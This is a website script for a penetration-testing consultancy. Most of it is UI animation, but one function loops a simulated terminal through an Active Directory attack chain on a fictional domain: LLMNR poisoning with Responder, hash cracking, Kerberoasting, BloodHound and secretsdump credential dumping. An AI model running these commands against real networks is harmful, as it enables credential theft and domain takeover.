// Kwang Security — premium consulting interactions
(function () {
  'use strict';

  // ── Aurora canvas (Stripe-style floating mesh gradient) ───────────────────
  function initAurora() {
    var canvas = document.createElement('canvas');
    canvas.id = 'aurora';
    canvas.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'z-index:0;pointer-events:none;';
    document.body.insertBefore(canvas, document.body.firstChild);

    var ctx = canvas.getContext('2d');
    var W = 0, H = 0;

    // Orbs: fixed orbital center + sine-wave offset
    var orbs = [
      { ox: 0.15, oy: 0.25, r: 0.65, color: [77, 124, 254],  a: 0,    sa: 0.00035, sb: 0.00028, pa: 0.14, pb: 0.10 },
      { ox: 0.85, oy: 0.15, r: 0.58, color: [139, 92, 246],  a: 2.1,  sa: 0.00025, sb: 0.00038, pa: 0.12, pb: 0.13 },
      { ox: 0.50, oy: 0.82, r: 0.60, color: [59, 130, 246],  a: 4.2,  sa: 0.00030, sb: 0.00022, pa: 0.16, pb: 0.11 },
      { ox: 0.72, oy: 0.55, r: 0.48, color: [167, 139, 250], a: 1.0,  sa: 0.00018, sb: 0.00032, pa: 0.10, pb: 0.14 },
      { ox: 0.30, oy: 0.70, r: 0.45, color: [99, 102, 241],  a: 3.3,  sa: 0.00022, sb: 0.00026, pa: 0.13, pb: 0.09 },
    ];

    function resize() {
      W = canvas.width  = window.innerWidth;
      H = canvas.height = window.innerHeight;
    }

    var t = 0;
    function draw() {
      ctx.clearRect(0, 0, W, H);
      t += 1;

      orbs.forEach(function (orb) {
        orb.a += orb.sa;
        var x = (orb.ox + Math.sin(orb.a)           * orb.pa) * W;
        var y = (orb.oy + Math.cos(orb.a * 1.3 + 1) * orb.pb) * H;
        var r = orb.r * Math.max(W, H) * 0.75;

        var g = ctx.createRadialGradient(x, y, 0, x, y, r);
        g.addColorStop(0,   'rgba(' + orb.color + ',0.20)');
        g.addColorStop(0.35,'rgba(' + orb.color + ',0.07)');
        g.addColorStop(1,   'rgba(' + orb.color + ',0)');

        ctx.fillStyle = g;
        ctx.fillRect(0, 0, W, H);
      });

      requestAnimationFrame(draw);
    }

    resize();
    draw();
    window.addEventListener('resize', resize, { passive: true });
  }

  // ── Noise texture overlay ────────────────────────────────────────────────
  function initNoise() {
    var c  = document.createElement('canvas');
    var cx = c.getContext('2d');
    c.width = c.height = 200;
    var id = cx.createImageData(200, 200);
    for (var i = 0; i < id.data.length; i += 4) {
      var v = (Math.random() * 255) | 0;
      id.data[i] = id.data[i+1] = id.data[i+2] = v;
      id.data[i+3] = 255;
    }
    cx.putImageData(id, 0, 0);

    var el = document.createElement('div');
    el.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'background-image:url(' + c.toDataURL() + ');' +
      'background-repeat:repeat;' +
      'opacity:0.022;pointer-events:none;z-index:9996;';
    document.body.appendChild(el);
  }

  // ── Grid overlay ─────────────────────────────────────────────────────────
  function initGrid() {
    var el = document.createElement('div');
    el.id  = 'grid-overlay';
    document.body.insertBefore(el, document.body.children[1] || null);
  }

  // ── Masthead: darken + blur more on scroll ─────────────────────────────
  function initNav() {
    var nav = document.querySelector('.masthead');
    if (!nav) return;
    window.addEventListener('scroll', function () {
      nav.classList.toggle('scrolled', window.scrollY > 50);
    }, { passive: true });
  }

  // ── Scroll reveal with staggered children ────────────────────────────────
  function initReveal() {
    if (!window.IntersectionObserver) {
      document.querySelectorAll('.c-reveal').forEach(function (el) {
        el.classList.add('is-visible');
      });
      return;
    }

    var io = new IntersectionObserver(function (entries) {
      entries.forEach(function (entry) {
        if (!entry.isIntersecting) return;
        entry.target.classList.add('is-visible');
        io.unobserve(entry.target);
      });
    }, { threshold: 0.08, rootMargin: '0px 0px -20px 0px' });

    var groups = ['.c-services', '.c-sessions', '.c-posts', '.c-recog-list', '.c-hero__inner', '.c-metrics'];
    groups.forEach(function (sel) {
      document.querySelectorAll(sel).forEach(function (parent) {
        Array.from(parent.children).forEach(function (child, i) {
          if (!child.classList.contains('c-reveal')) return;
          child.style.transitionDelay = (i * 0.09) + 's';
        });
      });
    });

    document.querySelectorAll('.c-reveal').forEach(function (el) { io.observe(el); });
  }

  // ── Animated counters (easeOutExpo) ──────────────────────────────────────
  function initCounters() {
    var el = document.getElementById('c-metrics');
    if (!el || !window.IntersectionObserver) return;

    var fired = false;
    var io = new IntersectionObserver(function (entries) {
      if (!entries[0].isIntersecting || fired) return;
      fired = true; io.disconnect();

      el.querySelectorAll('.c-metric__num').forEach(function (num) {
        var target   = parseInt(num.getAttribute('data-target'), 10);
        var suffix   = num.getAttribute('data-suffix') || '';
        var start    = performance.now();
        var duration = 1800;
        (function tick(now) {
          var p = Math.min((now - start) / duration, 1);
          var e = p === 1 ? 1 : 1 - Math.pow(2, -10 * p);
          num.textContent = (Math.floor(e * target)) + suffix;
          if (p < 1) requestAnimationFrame(tick);
          else num.textContent = target + suffix;
        })(performance.now());
      });
    }, { threshold: 0.5 });
    io.observe(el);
  }

  // ── Magnetic buttons ─────────────────────────────────────────────────────
  function initMagnetic() {
    document.querySelectorAll('.c-btn').forEach(function (btn) {
      btn.addEventListener('mousemove', function (e) {
        var r = btn.getBoundingClientRect();
        var x = (e.clientX - r.left - r.width  / 2) * 0.25;
        var y = (e.clientY - r.top  - r.height / 2) * 0.25;
        btn.style.transform = 'translate(' + x + 'px,' + y + 'px) translateY(-2px)';
      });
      btn.addEventListener('mouseleave', function () {
        btn.style.transform = '';
      });
    });
  }

  // ── Smooth nav section highlight ─────────────────────────────────────────
  function initNavHighlight() {
    var links = document.querySelectorAll('.masthead__menu-item a');
    if (!links.length) return;
    var secs = [];
    links.forEach(function (link) {
      var href = link.getAttribute('href') || '';
      if (!href.includes('#')) return;
      var sec = document.getElementById(href.split('#')[1]);
      if (sec) secs.push({ link: link, sec: sec });
    });
    window.addEventListener('scroll', function () {
      var y = window.scrollY + 140;
      secs.forEach(function (item) {
        var active = y >= item.sec.offsetTop && y < item.sec.offsetTop + item.sec.offsetHeight;
        item.link.style.color = active ? 'var(--blue)' : '';
      });
    }, { passive: true });
  }

  // ── Process: connected timeline + tab detail (Ellis O-1 replica) ─────────
  function initProcessTabs() {
    var steps = document.querySelectorAll('.c-timeline__step');
    var tabs = document.querySelectorAll('.c-process-detail__tab');
    var panels = document.querySelectorAll('.c-process-detail__panel');
    var trackFill = document.querySelector('[data-track-fill]');
    var pmPhase = document.querySelector('[data-pm="phase"]');
    var pmProgress = document.querySelector('[data-pm="progress"]');
    var pmChecks = document.querySelector('[data-pm="checks"]');
    if (!steps.length && !tabs.length) return;

    var phaseNames = ['Scoping', 'Discovery', 'Exploitation', 'Reporting'];
    var phaseChecks = [14, 287, 62, 9];
    var autoTimer = null;
    var checksTimer = null;

    function activate(stepId, fromAuto) {
      var stepNum = parseInt(stepId, 10);

      steps.forEach(function (s) {
        var id = parseInt(s.getAttribute('data-step'), 10);
        s.classList.remove('is-active', 'is-complete');
        if (id < stepNum) s.classList.add('is-complete');
        if (id === stepNum) s.classList.add('is-active');
      });

      if (trackFill && steps.length > 1) {
        var pct = ((stepNum - 1) / (steps.length - 1)) * 100;
        trackFill.style.width = (pct * 0.75) + '%';
      }

      tabs.forEach(function (t) { t.classList.remove('is-active'); });
      panels.forEach(function (p) { p.classList.remove('is-active'); });
      var tab = document.querySelector('.c-process-detail__tab[data-step="' + stepId + '"]');
      var panel = document.querySelector('.c-process-detail__panel[data-panel="' + stepId + '"]');
      if (tab) tab.classList.add('is-active');
      if (panel) panel.classList.add('is-active');

      // Update live metrics bar
      if (pmPhase)    pmPhase.textContent = phaseNames[stepNum - 1];
      if (pmProgress) pmProgress.textContent = (stepNum * 25) + '%';
      if (pmChecks)   pmChecks.setAttribute('data-target', phaseChecks[stepNum - 1]);
      startChecksTick(phaseChecks[stepNum - 1]);

      // Reset auto-advance timer when user interacts
      if (!fromAuto) restartAuto();
    }

    function nextStep() {
      var active = document.querySelector('.c-timeline__step.is-active');
      var current = active ? parseInt(active.getAttribute('data-step'), 10) : 1;
      var next = (current % steps.length) + 1;
      activate(String(next), true);
    }

    function startAuto() {
      stopAuto();
      autoTimer = setInterval(nextStep, 5000);
    }
    function stopAuto() {
      if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
    }
    function restartAuto() { stopAuto(); startAuto(); }

    // Animated count up/drift on checks number
    function startChecksTick(target) {
      if (!pmChecks) return;
      if (checksTimer) clearInterval(checksTimer);
      var current = parseInt(pmChecks.textContent.replace(/,/g, ''), 10) || 0;
      var step = target > current ? Math.max(1, Math.round((target - current) / 20)) : -Math.max(1, Math.round((current - target) / 20));
      var countedTo = current;
      checksTimer = setInterval(function () {
        countedTo += step;
        if ((step > 0 && countedTo >= target) || (step < 0 && countedTo <= target)) {
          countedTo = target;
          clearInterval(checksTimer);
          // Then start a small jitter to simulate "live" scanning
          checksTimer = setInterval(function () {
            var jitter = Math.floor(Math.random() * 5) - 2;
            var val = Math.max(1, target + jitter);
            pmChecks.textContent = val.toLocaleString();
          }, 900);
        }
        pmChecks.textContent = countedTo.toLocaleString();
      }, 50);
    }

    steps.forEach(function (s) {
      s.addEventListener('click', function () { activate(s.getAttribute('data-step')); });
    });
    tabs.forEach(function (t) {
      t.addEventListener('click', function () { activate(t.getAttribute('data-step')); });
    });

    // Keyboard navigation on tabs
    tabs.forEach(function (tab, idx) {
      tab.addEventListener('keydown', function (e) {
        if (e.key !== 'ArrowRight' && e.key !== 'ArrowLeft') return;
        e.preventDefault();
        var next = e.key === 'ArrowRight'
          ? (idx + 1) % tabs.length
          : (idx - 1 + tabs.length) % tabs.length;
        tabs[next].focus();
        tabs[next].click();
      });
    });

    // Pause auto-advance when user hovers the section
    var section = document.getElementById('process');
    if (section) {
      section.addEventListener('mouseenter', stopAuto);
      section.addEventListener('mouseleave', startAuto);
    }

    // Start on step 1 + begin auto-cycling
    activate('1', true);
    startAuto();
  }

  // ── Live Engagement Feed — full AD kill-chain terminal loop ─────────────
  function initLiveTerminal() {
    var term = document.querySelector('[data-live-term]');
    if (!term) return;

    // Kali-style prompt (two-line)
    var P1 = '<span class="tl-prompt-host">┌──(kwangyun㉿kali)</span><span class="tl-prompt-at">-</span><span class="tl-prompt-tilde">[~/engagements/acme]</span>';
    var P2 = '<span class="tl-prompt-host">└─</span><span class="tl-prompt-dollar">$</span> ';

    // Full kill-chain sequence. Each item:
    //   { cmd: '<html command>', out: ['<html line1>', ...], postWait: ms }
    var frames = [
      {
        cmd: '<span class="tl-cmd">nmap</span> <span class="tl-flag">-sS -sV -Pn -p</span> <span class="tl-num">88,135,389,445,636,3268</span> <span class="tl-num">10.10.10.0/24</span>',
        out: [
          '<span class="tl-dim">Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-16 09:14 UTC</span>',
          'Nmap scan report for <span class="tl-hi">dc01.acme.local</span> (<span class="tl-num">10.10.10.10</span>)',
          '<span class="tl-dim">Host is up (0.0021s latency).</span>',
          'PORT     STATE SERVICE      VERSION',
          '<span class="tl-num">88/tcp</span>   <span class="tl-ok">open</span>  kerberos-sec Microsoft Windows Kerberos',
          '<span class="tl-num">389/tcp</span>  <span class="tl-ok">open</span>  ldap         Microsoft Windows Active Directory LDAP',
          '<span class="tl-num">445/tcp</span>  <span class="tl-ok">open</span>  microsoft-ds Windows Server 2019 Standard 17763',
          '<span class="tl-num">636/tcp</span>  <span class="tl-ok">open</span>  tcpwrapped',
          '<span class="tl-num">3268/tcp</span> <span class="tl-ok">open</span>  ldap         Microsoft Windows AD LDAP (Global Catalog)',
          '<span class="tl-dim">Service detection performed. 1 IP (1 host up) scanned in 12.47s</span>',
        ],
        postWait: 900,
      },
      {
        cmd: '<span class="tl-cmd">netexec</span> smb <span class="tl-num">10.10.10.0/24</span> <span class="tl-flag">--shares -u</span> <span class="tl-str">\'\'</span> <span class="tl-flag">-p</span> <span class="tl-str">\'\'</span>',
        out: [
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     [*] Windows Server 2019 (name:DC01)</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     [+] acme.local\\: (Guest)</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     [*] Enumerated shares</span>',
          'SMB     10.10.10.10    445  DC01     Share          Permissions  Remark',
          'SMB     10.10.10.10    445  DC01     <span class="tl-hi">SYSVOL</span>         <span class="tl-ok">READ</span>         Logon server share',
          'SMB     10.10.10.10    445  DC01     <span class="tl-hi">NETLOGON</span>       <span class="tl-ok">READ</span>         Logon server share',
          '<span class="tl-warn">SMB     10.10.10.10    445  DC01     [!] SMB signing: False — vulnerable to relay</span>',
        ],
        postWait: 800,
      },
      {
        cmd: '<span class="tl-cmd">sudo responder</span> <span class="tl-flag">-I</span> <span class="tl-num">eth0</span> <span class="tl-flag">-wFd</span>',
        out: [
          '<span class="tl-dim">[+] Listening for events...</span>',
          '<span class="tl-dim">[*] [LLMNR] Poisoned answer sent to 10.10.10.42 for name WORKSTATION05</span>',
          '<span class="tl-dim">[*] [LLMNR] Poisoned answer sent to 10.10.10.42 for name WORKSTATION05</span>',
          '<span class="tl-ok">[SMB] NTLMv2-SSP Client   : 10.10.10.42</span>',
          '<span class="tl-ok">[SMB] NTLMv2-SSP Username : ACME\\<span class="tl-user">svc_backup</span></span>',
          '<span class="tl-ok">[SMB] NTLMv2-SSP Hash     : svc_backup::ACME:1a2b3c...[<span class="tl-dim">truncated</span>]...c93f</span>',
          '<span class="tl-dim">[*] Hash written to /root/.responder/Responder-Session.log</span>',
        ],
        postWait: 800,
      },
      {
        cmd: '<span class="tl-cmd">hashcat</span> <span class="tl-flag">-m</span> <span class="tl-num">5600</span> <span class="tl-flag">-a</span> <span class="tl-num">0</span> hash.txt <span class="tl-str">/usr/share/wordlists/rockyou.txt</span>',
        out: [
          '<span class="tl-dim">hashcat (v6.2.6) starting</span>',
          '<span class="tl-dim">* Device #1: NVIDIA GeForce RTX 4090, 23960/24260 MB, 128MCU</span>',
          '<span class="tl-dim">Dictionary cache built: /usr/share/wordlists/rockyou.txt</span>',
          '<span class="tl-dim">Speed.#1.........: 8943.2 MH/s (42.15ms)</span>',
          '<span class="tl-ok">SVC_BACKUP::ACME:1a2b3c:...:c93f:<span class="tl-pass">Winter2025!</span></span>',
          '<span class="tl-ok">Status: Cracked   Time: 00:00:14</span>',
        ],
        postWait: 900,
      },
      {
        cmd: '<span class="tl-cmd">netexec</span> smb <span class="tl-num">10.10.10.10</span> <span class="tl-flag">-u</span> <span class="tl-str">svc_backup</span> <span class="tl-flag">-p</span> <span class="tl-str">\'Winter2025!\'</span> <span class="tl-flag">--rid-brute</span>',
        out: [
          '<span class="tl-ok">SMB     10.10.10.10    445  DC01     [+] acme.local\\svc_backup:Winter2025!</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     500: ACME\\Administrator (SidTypeUser)</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     501: ACME\\Guest (SidTypeUser)</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     512: ACME\\Domain Admins (SidTypeGroup)</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     1103: ACME\\svc_backup (SidTypeUser)</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     1105: ACME\\svc_sql (SidTypeUser)</span>',
          '<span class="tl-dim">SMB     10.10.10.10    445  DC01     1109: ACME\\jdoe (SidTypeUser)</span>',
          '<span class="tl-hi">SMB     10.10.10.10    445  DC01     [+] 2,847 principals enumerated</span>',
        ],
        postWait: 800,
      },
      {
        cmd: '<span class="tl-cmd">impacket-GetUserSPNs</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">svc_backup</span>:<span class="tl-str">\'Winter2025!\'</span> <span class="tl-flag">-request</span>',
        out: [
          '<span class="tl-dim">Impacket v0.11.0 - Copyright 2023 Fortra</span>',
          'ServicePrincipalName       Name        MemberOf',
          '-------------------------  ----------  ----------',
          'MSSQLSvc/sql01.acme.local  <span class="tl-user">svc_sql</span>     CN=Domain Admins,CN=Users,DC=acme,DC=local',
          'HTTP/intra.acme.local      <span class="tl-user">svc_web</span>     CN=Domain Users,CN=Users,DC=acme,DC=local',
          '',
          '<span class="tl-ok">$krb5tgs$23$*svc_sql$ACME$MSSQLSvc/sql01.acme.local*$...[<span class="tl-dim">redacted</span>]</span>',
        ],
        postWait: 800,
      },
      {
        cmd: '<span class="tl-cmd">hashcat</span> <span class="tl-flag">-m</span> <span class="tl-num">13100</span> tgs.hash <span class="tl-str">/usr/share/wordlists/rockyou.txt</span>',
        out: [
          '<span class="tl-dim">hashcat (v6.2.6) starting</span>',
          '<span class="tl-dim">Kerberos 5, etype 23, TGS-REP detected</span>',
          '<span class="tl-ok">$krb5tgs$23$*svc_sql*...[redacted]:<span class="tl-pass">Summer2025!</span></span>',
          '<span class="tl-ok">Status: Cracked   Time: 00:00:08   Recovered: 1/1</span>',
          '<span class="tl-hi">[*] svc_sql is a member of Domain Admins — pivoting to DC</span>',
        ],
        postWait: 900,
      },
      {
        cmd: '<span class="tl-cmd">bloodhound-python</span> <span class="tl-flag">-u</span> <span class="tl-str">svc_sql</span> <span class="tl-flag">-p</span> <span class="tl-str">\'Summer2025!\'</span> <span class="tl-flag">-d</span> <span class="tl-domain">acme.local</span> <span class="tl-flag">-c</span> <span class="tl-num">all</span>',
        out: [
          '<span class="tl-dim">INFO: Found AD domain: acme.local</span>',
          '<span class="tl-dim">INFO: Connecting to LDAP server: dc01.acme.local</span>',
          '<span class="tl-dim">INFO: Collected 2,847 users, 412 computers, 183 groups</span>',
          '<span class="tl-dim">INFO: Collected 19 domain trusts, 1,204 ACLs</span>',
          '<span class="tl-ok">[*] Domain collection finished in 9.3s · 4 JSON files written</span>',
          '<span class="tl-hi">[*] Shortest path to Domain Admin: 2 edges via svc_sql → HasSession → DC01</span>',
        ],
        postWait: 800,
      },
      {
        cmd: '<span class="tl-cmd">impacket-secretsdump</span> <span class="tl-domain">acme.local</span>/<span class="tl-user">svc_sql</span>:<span class="tl-str">\'Summer2025!\'</span>@<span class="tl-num">10.10.10.10</span> <span class="tl-flag">-just-dc</span>',
        out: [
          '<span class="tl-dim">Impacket v0.11.0 - Copyright 2023 Fortra</span>',
          '<span class="tl-dim">[*] Target system bootKey: 0x4a7f...</span>',
          '<span class="tl-dim">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span>',
          '<span class="tl-dim">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span>',
          '<span class="tl-ok">acme.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">d7e6[...redacted...]91a</span>:::</span>',
          '<span class="tl-ok">acme.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<span class="tl-pass">8c31[...redacted...]fd4</span>:::</span>',
          '<span class="tl-dim">[*] Cleaning up...</span>',
          '<span class="tl-hi">[+] 2,847 credentials dumped · krbtgt compromised · Golden Ticket possible</span>',
        ],
        postWait: 1100,
      },
      {
        cmd: '<span class="tl-cmd">echo</span> <span class="tl-str">"Engagement complete."</span>',
        out: [
          '',
          '<span class="tl-banner">╭───────────────────────────────────────────────────────────────╮</span>',
          '<span class="tl-banner">│  ENGAGEMENT CONCLUDED · acme.local · 2026-04-16 17:42 UTC     │</span>',
          '<span class="tl-banner">│                                                               │</span>',
          '<span class="tl-banner">│  Initial foothold:       LLMNR poisoning (Tier 0 misconfig)   │</span>',
          '<span class="tl-banner">│  Lateral movement:       Kerberoasting → svc_sql → DA         │</span>',
          '<span class="tl-banner">│  Objective achieved:     Domain Admin on DC01 (9 days)        │</span>',
          '<span class="tl-banner">│  Detection gaps:         12 documented · 4 critical           │</span>',
          '<span class="tl-banner">│  Report delivery:        scheduled + retest in 30 days        │</span>',
          '<span class="tl-banner">╰───────────────────────────────────────────────────────────────╯</span>',
          '',
        ],
        postWait: 2600,
      },
    ];

    var typingSpeed = 14;         // ms per char while typing command
    var lineDelay = 95;           // ms between output lines
    var interFrameWait = 500;     // pause after output before next prompt
    var clearBetweenLoops = true;
    var maxLinesBeforeScroll = 22;

    var rafHandle = null;

    function appendLine(html) {
      var div = document.createElement('span');
      div.className = 'tl-line';
      div.innerHTML = html;
      term.appendChild(div);
      // Auto-scroll within body if overflowing
      if (term.children.length > maxLinesBeforeScroll) {
        term.scrollTop = term.scrollHeight;
      }
    }

    function removeCursor() {
      var c = term.querySelector('.tl-cursor');
      if (c) c.remove();
    }

    function writePrompt() {
      removeCursor();
      appendLine(P1);
      var promptLine = document.createElement('span');
      promptLine.className = 'tl-line';
      promptLine.innerHTML = P2;
      var cursor = document.createElement('span');
      cursor.className = 'tl-cursor';
      promptLine.appendChild(cursor);
      term.appendChild(promptLine);
      return promptLine;
    }

    function sleep(ms) {
      return new Promise(function (r) { setTimeout(r, ms); });
    }

    async function typeHtmlInto(line, html) {
      // Parse HTML into a tmp node, then stream its characters, preserving tags
      var tmp = document.createElement('div');
      tmp.innerHTML = html;
      var src = tmp.firstChild;
      var cursor = line.querySelector('.tl-cursor');
      // Walk nodes and type content character-by-character
      async function typeNode(node, target) {
        if (node.nodeType === Node.TEXT_NODE) {
          var text = node.textContent;
          for (var i = 0; i < text.length; i++) {
            target.insertBefore(document.createTextNode(text[i]), cursor);
            await sleep(typingSpeed);
          }
        } else if (node.nodeType === Node.ELEMENT_NODE) {
          var clone = document.createElement(node.tagName);
          for (var a = 0; a < node.attributes.length; a++) {
            clone.setAttribute(node.attributes[a].name, node.attributes[a].value);
          }
          target.insertBefore(clone, cursor);
          for (var c = 0; c < node.childNodes.length; c++) {
            await typeChildIntoClone(node.childNodes[c], clone);
          }
        }
      }
      async function typeChildIntoClone(node, clone) {
        if (node.nodeType === Node.TEXT_NODE) {
          var text = node.textContent;
          for (var i = 0; i < text.length; i++) {
            clone.appendChild(document.createTextNode(text[i]));
            await sleep(typingSpeed);
          }
        } else if (node.nodeType === Node.ELEMENT_NODE) {
          var sub = document.createElement(node.tagName);
          for (var a = 0; a < node.attributes.length; a++) {
            sub.setAttribute(node.attributes[a].name, node.attributes[a].value);
          }
          clone.appendChild(sub);
          for (var c = 0; c < node.childNodes.length; c++) {
            await typeChildIntoClone(node.childNodes[c], sub);
          }
        }
      }
      for (var i = 0; i < tmp.childNodes.length; i++) {
        await typeNode(tmp.childNodes[i], line);
      }
    }

    async function runFrame(frame) {
      var line = writePrompt();
      await typeHtmlInto(line, frame.cmd);
      await sleep(300);
      removeCursor();
      // Newline implicit — each output line is its own span.tl-line
      for (var i = 0; i < frame.out.length; i++) {
        appendLine(frame.out[i]);
        await sleep(lineDelay);
      }
      await sleep(frame.postWait || interFrameWait);
    }

    async function runLoop() {
      while (true) {
        if (clearBetweenLoops) term.innerHTML = '';
        for (var i = 0; i < frames.length; i++) {
          await runFrame(frames[i]);
        }
        await sleep(1600);
      }
    }

    // Only start when visible — saves CPU
    var started = false;
    var io = new IntersectionObserver(function (entries) {
      entries.forEach(function (e) {
        if (e.isIntersecting && !started) {
          started = true;
          runLoop();
        }
      });
    }, { threshold: 0.2 });
    io.observe(term.closest('.c-live-demo'));
  }

  // ── Boot ─────────────────────────────────────────────────────────────────
  document.addEventListener('DOMContentLoaded', function () {
    // Aurora / noise / grid disabled for light theme
    // initAurora();
    // initNoise();
    // initGrid();
    initNav();
    initReveal();
    initCounters();
    initMagnetic();
    initNavHighlight();
    initProcessTabs();
    initLiveTerminal();
  });
})();
